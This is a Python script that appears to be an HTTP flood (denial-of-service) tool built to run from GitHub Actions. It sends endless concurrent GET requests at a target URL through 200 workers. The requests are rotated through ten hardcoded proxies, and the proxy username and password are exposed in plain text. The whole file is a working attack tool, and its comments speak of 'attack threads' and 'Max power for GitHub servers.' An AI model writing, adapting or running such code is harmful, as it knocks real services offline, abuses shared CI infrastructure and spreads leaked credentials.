import asyncio
import aiohttp
import os
import sys

def log(msg):
    print(f"{msg}", flush=True)

class SparxEliteAuth:
    def __init__(self):
        self.target = os.environ.get("TARGET_URL", "")
        self.stats = {"success": 0, "failed": 0}
        self.concurrency = 200 # Max power for GitHub servers
        
        # [span_3](start_span)Webshare Proxies with Auth[span_3](end_span)
        # Format: http://username:password@ip:port
        self.proxies = [
            "http://nwllkxds:li0q0dyj1sdw@191.96.254.138:6185",
            "http://nwllkxds:li0q0dyj1sdw@142.111.67.146:5611",
            "http://nwllkxds:li0q0dyj1sdw@216.10.27.159:6837",
            "http://nwllkxds:li0q0dyj1sdw@64.137.96.74:6641",
            "http://nwllkxds:li0q0dyj1sdw@198.105.121.200:6462",
            "http://nwllkxds:li0q0dyj1sdw@107.172.163.27:6543",
            "http://nwllkxds:li0q0dyj1sdw@45.38.107.97:6014",
            "http://nwllkxds:li0q0dyj1sdw@198.23.239.134:6540",
            "http://nwllkxds:li0q0dyj1sdw@23.95.150.145:6114",
            "http://nwllkxds:li0q0dyj1sdw@31.59.20.176:6754"
        ]

    async def worker(self, session, sem):
        while True:
            for p in self.proxies:
                # Loop each elite proxy 900 times per cycle
                for _ in range(900):
                    async with sem:
                        try:
                            async with session.get(self.target, proxy=p, timeout=5) as r:
                                if r.status == 200:
                                    self.stats["success"] += 1
                                else:
                                    self.stats["failed"] += 1
                        except:
                            self.stats["failed"] += 1
                    
                    if (self.stats["success"] + self.stats["failed"]) % 50 == 0:
                        log(f"🚀 SPARX NITRO >> HITS: {self.stats['success']} | FAIL: {self.stats['failed']}")

    async def start(self):
        if not self.target:
            log("❌ ERROR: No target URL provided in GitHub Actions!")
            return

        log(f"🔥 ELITE CLOUD BURST ACTIVATED: {self.target}")
        log(f"📡 NODES: {len(self.proxies)} Webshare Elite Proxies Authenticated.")
        
        sem = asyncio.Semaphore(self.concurrency)
        async with aiohttp.ClientSession() as session:
            # Launch parallel attack threads
            tasks = [self.worker(session, sem) for _ in range(self.concurrency)]
            await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(SparxEliteAuth().start())
